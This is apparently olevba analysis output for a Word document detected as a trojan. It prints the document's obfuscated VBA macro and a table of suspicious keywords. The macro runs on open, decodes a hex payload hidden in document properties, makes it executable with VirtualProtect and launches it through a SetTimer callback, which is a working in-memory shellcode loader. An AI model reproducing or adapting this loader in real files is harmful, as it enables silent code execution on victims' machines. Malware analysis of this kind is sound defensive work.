olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-512a87015c86a0eb87701bb75f381b4d2e5720df12aedad7e37bec52bcc8a139
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-512a87015c86a0eb87701bb75f381b4d2e5720df12aedad7e37bec52bcc8a139 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function DismissesHypsographical Lib "user32" Alias "KillTimer" (ByVal TemporallyWolds As LongPtr, ByVal AcceleratedlySaururaceae As LongPtr) As LongPtr
#Else
Private Declare Function SuprachoroidalQuadridentatedHalavah Lib "user32" Alias "SetTimer" ( ByVal ExacerbatinglyBefittedGlegly As Long, ByVal UndishonoredMugilCylindrella As Long, ByVal RetransmissionSuperficeUnsatedness As Long, ByVal ApogamiesPredemonstrating As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function SuprachoroidalQuadridentatedHalavah Lib "user32" Alias "SetTimer" (ByVal AzurousPseudoanarchisticTjanting As LongPtr, ByVal CyanastrumSaxondomUnbeaming As LongPtr, ByVal PlurificationAssailants As LongPtr, ByVal CrinolinesPharynogotomeLignicoline As LongPtr) As LongPtr
Private Declare PtrSafe Function UncoincidedEdwardeanCountercathexis Lib "kernel32" Alias "VirtualProtect" (ByVal StelicVictoress As LongPtr, ByVal RackfulOutclassReattacked As LongPtr, ByVal UntoothsomenessUnhermeticSnakefishes As LongPtr, MollitiesHireless As LongPtr) As LongPtr
#Else
Private Declare Function UncoincidedEdwardeanCountercathexis Lib "kernel32" Alias "VirtualProtect"  (ByVal SynonymizeUncompoundedQuinton As Long, ByVal UnmisguidedProverbializeSlakable As Long, ByVal MissaPhallaceousTeacherage As Long, MisdatedTextmanPrepurposed As Long) As Long
Private Declare Function DismissesHypsographical Lib "user32" Alias "KillTimer" ( ByVal WleccheHerse As Long, ByVal TergiversateUncalm As Long) As Long
#End If
Private Sub Document_Open()
Dim ForetopComitje() As Byte
#If Win64 Then
ForetopComitje = AgleafFerrywayEquant(ActiveDocument.BuiltInDocumentProperties(mbJD_77SqK("ZILw5_gox")).Value)
#Else
ForetopComitje = AgleafFerrywayEquant(ActiveDocument.BuiltInDocumentProperties(mbJD_77SqK("DlX3w6xe")).Value)
#End If
#If VBA7 Then
Dim OceanousVermont As LongPtr
Dim RelaxatoryErigeniaPhysicotheological As LongPtr
Dim JubileeCuruminacan As LongPtr
Dim EllenPoeticalnessTrifistulary As LongPtr
#Else
Dim OceanousVermont As Long
Dim RelaxatoryErigeniaPhysicotheological As Long
Dim JubileeCuruminacan As Long
Dim EllenPoeticalnessTrifistulary As Long
#End If
RelaxatoryErigeniaPhysicotheological = UBound(ForetopComitje) + 1
JubileeCuruminacan = VarPtr(ForetopComitje(0))
UncoincidedEdwardeanCountercathexis JubileeCuruminacan, RelaxatoryErigeniaPhysicotheological, 64, VarPtr(OceanousVermont)
GetObject(mbJD_77SqK("DR0TXCabi")).Environment(mbJD_77SqK("PDoeLpbIP6"))(mbJD_77SqK("KXPwaXtua3")) = ActiveDocument.FullName
GetObject(mbJD_77SqK("pAwij7ec3G")).Environment(mbJD_77SqK("aWUfP0X0ID3L"))(mbJD_77SqK("ZEDQloAOV")) = mbJD_77SqK("TrqgVm")
EllenPoeticalnessTrifistulary = SuprachoroidalQuadridentatedHalavah(0, JubileeCuruminacan, 1, JubileeCuruminacan)
PogoniasUncomprehensible 1
DismissesHypsographical 0, EllenPoeticalnessTrifistulary
GetObject(mbJD_77SqK("TgXH5G9R2b")).Environment(mbJD_77SqK("gapoeni0E")).Remove (mbJD_77SqK("krFi1cOoH"))
GetObject(mbJD_77SqK("YqJ887W5Z")).Environment(mbJD_77SqK("rnmdhmhcp7")).Remove (mbJD_77SqK("NIcfv8O9T"))
ReDim ForetopComitje(1)
End Sub
Public Function mbJD_77SqK(strInput)
mbJD_77SqK = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Sub PogoniasUncomprehensible(Finish)
Dim BibaciousnessClinodomatic As Long
Dim InterpleadsHorselaughterEnkolpion As Long
InterpleadsHorselaughterEnkolpion = Timer() + (Finish)
Do
BibaciousnessClinodomatic = Timer()
DoEvents
Loop Until BibaciousnessClinodomatic > InterpleadsHorselaughterEnkolpion
End Sub
Function BelabouringCervus(DecorablyDesmoscolexProtorosauroid, ThalamopeduncularBouretteSentinels)
BelabouringCervus = Mid(DecorablyDesmoscolexProtorosauroid, ThalamopeduncularBouretteSentinels + 1, 1)
End Function
Function FreudiansIndistinct(SoothsayershipRattlingly) As Long
If Int(Rnd(23)) > 2 Then
FreudiansIndistinct = 9000
Else
FreudiansIndistinct = Len(SoothsayershipRattlingly)
End If
End Function
Function AgleafFerrywayEquant(UndepuratedMarquois)
ReDim ConsequenceDactylousCabal(FreudiansIndistinct(UndepuratedMarquois) - 1) As Byte
Dim UnearnestlyGermanium As Long, PhagePhotoimpression As Long
Dim BurdenersMyrmecophytic: BurdenersMyrmecophytic = mbJD_77SqK("TPfP9BgXT") & mbJD_77SqK("UrY4Modd")
For UnearnestlyGermanium = 0 To FreudiansIndistinct(UndepuratedMarquois) - 1 Step 2
PhagePhotoimpression = UnearnestlyGermanium / 2
ConsequenceDactylousCabal(PhagePhotoimpression) = CDec(BurdenersMyrmecophytic & BelabouringCervus(UndepuratedMarquois, UnearnestlyGermanium) & BelabouringCervus(UndepuratedMarquois, UnearnestlyGermanium + 1))
Next
AgleafFerrywayEquant = ConsequenceDactylousCabal
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

